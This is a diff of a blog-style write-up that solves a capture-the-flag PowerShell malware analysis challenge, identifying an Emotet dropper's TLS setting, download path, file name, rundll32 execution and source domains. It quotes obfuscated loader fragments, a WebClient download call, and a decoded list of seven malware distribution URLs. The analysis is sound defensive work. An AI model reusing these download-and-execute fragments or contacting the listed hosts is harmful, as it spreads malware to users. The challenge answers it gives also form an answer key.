@@ -53,7 +53,9 @@ OK, so it's asking about SSL, TLS, etc, here. Which protocol is the malware usin
   ( vARiaBLe  ("m"+"bu")  -VAlueoN  )::"sEcuRITYproT`o`c`ol" = ('T'+('ls'+'12'))
 ```
 
-Earlier, I mentioned that PowerShell effectively ignores capitalization for most input. Well, it also uses backtick operators (\`) to allow for creating tabs and new lines in string outputs. If the backtick is used without the new line/tab/space, PowerShell simply ignores the backtick and concatenates the input before and after it instead. In this case, the backticks are used to obfuscate the string, likely as a way of visually breaking up the text so it's less legible during analysis, but it also could get around some basic signature-based analysis. Looking at this line holistically, we see that the variable `mbu` is having the value `sEcuRITYproTocol=Tls12` set/applied, so our answer to the question is TLS 1.2, a fairly secure protocol.
+Earlier, I mentioned that PowerShell effectively ignores capitalization for most input. Well, it also uses backtick operators (\`) to allow for creating tabs and new lines in string outputs. If the backtick is used without the new line/tab/space, PowerShell simply ignores the backtick and concatenates the input before and after it instead. In this case, the backticks are used to obfuscate the string, likely as a way of visually breaking up the text so it's less legible during analysis, but it also could get around some basic signature-based analysis. Looking at this line holistically, we see that the variable `mbu` has the value `sEcuRITYproTocol=Tls12` set/applied, so our answer to the question is TLS 1.2, a fairly secure protocol.
+
+__Solved!__
 
 ## Question 2
 > What directory does the obfuscated PowerShell create? (Starting with \HOME\)
@@ -75,7 +77,7 @@ __Solved!__
 ## Question 3 
 > What file is being downloaded (full name)?
 
-Now that we have the directory created by the malware, finding this should be a breeze. Looking at lines 9-11, we see 3 variable declarations, but only one is reused later in the script. Based on the obfuscation, it's possible that the other who are referenced within other obfuscated lines. However, since `$Swrp6tc` shows up in full in line 12, which also references the `$HOME` directory, I'll start there and see what we got. 
+Now that we have the directory created by the malware, finding this should be a breeze. Looking at lines 9-11, we see 3 variable declarations, but only one is reused later in the script. Based on the obfuscation, it's possible that the other ones are referenced within other obfuscated lines. However, since `$Swrp6tc` shows up in full in line 12, which also references the `$HOME` directory, I'll start there and see what we got. 
 ```powershell
 $Imd1yck=$HOME+((('UO'+'H'+'Db_')+'b'+('h3'+'0UO')+('HY'+'f')+('5be5'+'g'+'UOH'))."ReP`lACe"(('U'+'OH'),[StrInG]  [chAr]92))+$Swrp6tc+(('.'+'dl')+'l')
 ```
@@ -92,22 +94,28 @@ A69S.dll
 ```
 And there's our file name!
 
+__Solved!__
+
 ## Question 4
 > What is used to execute the downloaded file?
 
 Now, we're in the home stretch. We know the script is using `$Imd4yck` as a reference to the file. In line 16, we see `try{(&(New-Object) System.Net.WebClient.DownloadFile($Bm5pw6z, $Imd1yck)`
 
-Line 16 begins with a foreach loop, which iterates through `$B9fhbyv` and attempts to download the file and save it to our A69S.dll path. If we echo `$B9fhbyv`, we see that it's a list of URIs: 
+Line 16 begins with a foreach loop, which iterates through `$B9fhbyv` and attempts to download the file and save it to our `A69S.dll` file. If we echo `$B9fhbyv`, we see that it's a list of URIs: 
 ```powershell
 PS /share/Malicious PowerShell Analysis/BTLO PowerShell Analysis> echo $(']'+('a'+'nw[3s://adm'+'int'+'k.c'+'o'+'m/'+'w')+('p-adm'+'in/'+'L/')+'@'+(']a'+'n'+'w[3s')+':'+'/'+'/m'+('ike'+'ge')+('e'+'r'+'inck.')+('c'+'om')+('/c/'+'Y'+'Ys')+'a'+('/@]'+'anw'+'['+'3://free'+'lanc'+'e'+'rw')+('ebdesi'+'gnerh'+'yd')+('er'+'aba')+('d.'+'com/')+('cgi'+'-bin'+'/S')+('/'+'@'+']anw')+('[3'+'://'+'etdog.co'+'m'+'/w')+('p-'+'co')+'nt'+('e'+'nt')+('/n'+'u/@')+(']a'+'nw[3')+'s'+('://'+'www'+'.hintu'+'p.c')+('o'+'m.')+('b'+'r/')+'w'+('p'+'-co')+('n'+'ten')+('t'+'/dE/'+'@]a'+'nw[3://'+'www.')+'s'+('tm'+'arouns'+'.')+('ns'+'w')+('.'+'edu.au/p'+'a'+'y'+'pal/b8')+('G'+'/@]')+('a'+'nw[')+('3:'+'/')+('/'+'wm.mcdeve'+'lop.net'+'/'+'c'+'on'+'t'+'e')+('nt'+'/')+'6'+('F2'+'gd/'))."RE`p`lACe"(((']a'+'n')+('w'+'[3')),([array]('sd','sw'),(('h'+'tt')+'p'),'3d')[1])."s`PLIT"($C83R + $Cvmmq4o + $F10Q)
 https://admintk.com/wp-admin/L/@https://mikegeerinck.com/c/YYsa/@http://freelancerwebdesignerhyderabad.com/cgi-bin/S/@http://etdog.com/wp-content/nu/@https://www.hintup.com.br/wp-content/dE/@http://www.stmarouns.nsw.edu.au/paypal/b8G/@http://wm.mcdevelop.net/content/6F2gd/
 ```
 It looks like 7 URIs separated by @ symbols. On line 18, we see the script check whether the downloaded file is a valid size. If it is, it continues by executing rundll32, pointing at the newly downloaded DLL. Looking back at the question, we have our answer, `rundll32`.
 
+__Solved!__
+
 ## Question 5
 > What is the domain name of the URI ending in '/6F2gd/'?
 
 Fortunately, we previously ran `$B9fhbyv` through PowerShell and decoded the list of URIs. Looking back at the list we see the last item ends in `6F2gd`, so we just input the domain itself `wm.mcdevelop.net`!
+
+__Solved!__
 
 ## Question 6 
 > Based on the analysis of the obfuscated code, what is the name of the malware?
@@ -117,6 +125,7 @@ You can fairly easily pull out bits from this script that are unlikely to change
 ![](images/BTLO_PowerShell_1/powershell7.png)
 
 Welp, this has definitely been seen before! Tria.ge indicates this is an emotet sample. Easy-peasy!
+
 __Solved!__
 
 I hope that was understandable (and to some extent enjoyable). If you have any real-world obfuscated PowerShell and would be comfortable sharing it with me so I could do this again with it, please reach out, preferably via Twitter (handle at the bottom).
